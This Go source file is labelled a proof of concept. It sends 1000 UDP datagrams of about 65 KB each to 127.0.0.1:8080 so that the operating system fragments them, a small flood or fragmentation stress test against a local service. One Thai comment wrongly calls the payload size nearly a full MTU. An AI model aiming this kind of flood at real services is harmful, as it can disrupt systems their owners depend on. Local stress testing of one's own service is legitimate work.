package main

import (
	"log"
	"net"
)

// PoC
func main() {
	target := "127.0.0.1:8080"
	conn, err := net.Dial("udp", target)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	// ส่ง packet ที่มี payload ใหญ่ -> os จะ fragment ให้อัตโนมัติ
	payload := make([]byte, 65500) // เกือบเต็ม MTU
	for i := 0; i < 1000; i++ {
		conn.Write(payload)
	}
}
